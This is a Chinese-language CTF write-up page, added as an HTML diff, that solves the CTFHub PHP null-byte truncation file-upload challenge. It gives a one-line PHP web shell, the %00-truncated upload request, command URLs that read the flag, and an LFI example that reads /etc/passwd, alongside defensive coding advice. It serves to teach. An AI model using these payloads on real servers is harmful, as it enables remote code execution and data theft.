@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: CTFHub 文件上传 - 00截断 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-cut"></i> CTFHub 文件上传 - 00截断</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月22日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> 文件上传</span>
+            <span><i class="fas fa-tag"></i> 00截断</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - 00截断</li>
+            <li><strong>题目平台：</strong>CTFHub 技能树</li>
+            <li><strong>题目类型：</strong>Web安全 / 文件上传漏洞 / 空字节注入截断</li>
+            <li><strong>靶场链接：</strong>http://challenge-d773b3eee1695651.sandbox.ctfhub.com:10800（动态环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器、Burp Suite 抓包工具、Base64在线解码工具</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>PHP 5.2 版本及以下的 00 截断漏洞（Null Byte Injection）</strong>。服务器设置了白名单机制，仅允许上传图片格式。漏洞点在于后端将用户可控的 URL 参数（<code>road</code>）拼接到了保存路径中。攻击者可以利用 C 语言底层字符串以空字节 <code>\0</code>（URL 中为 <code>%00</code>）作为结束标志的特性，截断并丢弃路径后面的后缀，将恶意脚本保存为 <code>.php</code> 格式，实现 RCE。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>尝试上传 <code>shell.php</code> 被拦截，说明有白名单过滤。上传 <code>shell.jpg</code> 成功，但无法执行。</li>
+            <li>通过查看源码（Burp 或响应包注释），发现保存路径由 <code>$des = $_GET['road'] . "/" . ... . "." . $ext;</code> 拼接而成。</li>
+            <li>既然路经拼接用的是 <code>road</code> 参数，我们只要在 URL 的 <code>road</code> 参数末尾加上 <code>%00</code>，即可在底层截断后面的随机数和后缀，将文件强行存为 <code>shell.php</code>。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：修改位置错误（在 filename 中截断）</h4>
+            <p><strong>踩坑情况：</strong>在 Burp 中拦截，试图修改 Body 里的 <code>filename="shell.php%00.jpg"</code>，结果上传后一直 404。</p>
+            <p><strong>原因分析：</strong>后端代码提取了 <code>filename</code> 用于获取扩展名（白名单校验），但并没有用它拼接路径，而是用了 <code>$_GET['road']</code>。改 filename 对路径拼接毫无影响。</p>
+            <p><strong>改进方式：</strong>必须回到请求的第一行，修改 URL：<code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code>。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：Burp 文本模式下直接输 %00 失效</h4>
+            <p><strong>踩坑情况：</strong>在 URL 里手写 <code>%00</code>，放行后服务器依然保存成了乱码文件名或无法解析。</p>
+            <p><strong>原因分析：</strong>Burp Suite 在 Raw 模式下，可能会将 <code>%00</code> 作为三个普通字符发送，而不是真正的空字节。</p>
+            <p><strong>改进方式：</strong>切换到 Hex 模式（十六进制视图），找到 URL 中对应 <code>%00</code> 的位置，手动将其替换为真正的十六进制字节 <code>00</code>。这样底层 C 函数才能真正识别到截断。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤</h4>
+            <p><strong>第一步：准备文件</strong></p>
+            <p>本地新建 <code>shell.jpg</code>（白名单绕过），写入代码：</p>
+            <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+            <p><strong>代码逐字深度解析：</strong></p>
+            <ul>
+                <li><code>&lt;?php</code>：PHP 脚本起始标记。</li>
+                <li><code>system</code>：执行外部系统命令并输出结果的内置函数。</li>
+                <li><code>( )</code>：函数参数括号。</li>
+                <li><code>$_GET</code>：接收 HTTP GET 请求的全局数组。</li>
+                <li><code>[ 'cmd' ]</code>：提取 URL 中名为 <code>cmd</code> 的参数。</li>
+                <li><code>;</code> 和 <code>?&gt;</code>：PHP 语句和脚本结束符。</li>
+            </ul>
+
+            <p><strong>第二步：抓包并修改 URL</strong></p>
+            <p>开启 Burp 拦截，上传 <code>shell.jpg</code>。在 Burp 中修改请求第一行：</p>
+            <pre><code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code></pre>
+            <p>保持 Body 里的 <code>filename="shell.jpg"</code> 不变。放行。页面提示上传成功。</p>
+
+            <p><strong>第三步：寻找并读取 Flag</strong></p>
+            <p>1. 验证：<code>http://.../upload/shell.php?cmd=ls /var/www/html/</code> 找到 <code>flag_xxxx.php</code>。<br>
+               2. 读取：因为 <code>cat</code> 会触发 PHP 解析导致注释被吞，必须用 Base64 读取：<br>
+               <code>http://.../upload/shell.php?cmd=base64 /var/www/html/flag_xxxx.php</code><br>
+               3. 在线 Base64 解码，得到最终 Flag：<code>ctfhub{b905cd2623a389c741c6bdcc}</code>。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>代码审计与漏洞挖掘：</strong>在审计源码时，只要看到 <code>$_GET</code> 或 <code>$_POST</code> 直接拼接进文件路径（如 <code>include</code>、<code>move_uploaded_file</code>、<code>fopen</code>），就要立刻联想是否存在截断或路径穿越漏洞。</li>
+            <li><strong>安全开发（SDL）：</strong>现代 PHP 已修复该漏洞。开发人员必须做到：绝不信任用户输入，对路径进行硬编码，使用 <code>basename()</code> 剥离路径，并对文件进行重命名（如 MD5 时间戳），彻底杜绝拼接。</li>
+            <li><strong>CTF 其他题型：</strong>00 截断同样适用于本地文件包含（LFI）绕过后缀限制，例如 <code>?file=../../etc/passwd%00</code>。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 00 截断（Null Byte Injection）本质</h4>
+            <p>在 C 语言中，字符串以空字符 <code>\0</code>（十六进制的 00）作为结束标志。PHP 底层由 C 实现，在 PHP 5.2 中，如果用户可控的字符串包含 <code>\0</code>，底层系统 API 在读取文件路径时会在此处停止，从而丢弃后续字符。这就是截断漏洞的根源。</p>
+
+            <h4>2. 白名单校验与路径拼接分离的错误</h4>
+            <p>代码先用 <code>filename</code> 的扩展名去白名单比对，通过后用 <code>road</code> 参数拼接。这种“校验逻辑”与“执行逻辑”使用不同变量的做法，导致攻击者可以控制执行逻辑（road）绕过校验逻辑（ext）。</p>
+
+            <h4>3. move_uploaded_file 的底层机制</h4>
+            <p>PHP 用于移动上传临时文件的函数。底层执行时会调用操作系统的文件系统调用。当传入路径包含空字节 <code>\0</code> 时，系统调用读取路径到 <code>\0</code> 停止，把原本的 <code>shell.php%00/xx.jpg</code> 变成真实的 <code>shell.php</code>。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 MIME 绕过的区别：</strong>MIME 是欺骗服务器“文件是什么类型”；00 截断是欺骗底层系统“文件名到此为止”。前者是逻辑层欺骗，后者是底层系统层欺骗。</li>
+            <li><strong>与 .htaccess 的区别：</strong>.htaccess 是修改服务器解析规则；00 截断是强行把文件存成 php 后缀，两者殊途同归，都是绕过上传限制并获得 RCE。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>历史遗留问题。PHP 5.2 时代风靡全球，开发者对安全认知不足，习惯直接用 <code>$_GET</code> 拼接路径。PHP 底层 C 实现的字符串处理缺陷导致空字节注入。现代版本（PHP 5.3.4+）已彻底修复。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实渗透中，00 截断常用于：文件包含（LFI）绕过强制后缀，SQL 注入截断过滤，或者利用老旧系统的命令执行拼接。但现代环境中已非常罕见，更多是作为 CTF 教学案例。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把服务器文件系统比作仓库管理员：</strong></p>
+            <ul>
+                <li><strong>常规上传：</strong>你提交单子：“存一个文件，名字叫 shell.php%00/随便乱码.jpg”。</li>
+                <li><strong>白名单检查（前端的保安）：</strong>“根据单子，扩展名是 .jpg，合法，通过。”</li>
+                <li><strong>底层截断（仓库管理员）：</strong>管理员拿到单子看名字：“s-h-e-l-l-.-p-h-p-[停]”。管理员只要看到“空字符（%00）”就认为单子写完了，完全忽略后面的“/随便乱码.jpg”，按“shell.php”存进了仓库。</li>
+                <li><strong>最终结果：</strong>你成功骗过保安，把危险文件存成了解析器能执行的名字。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
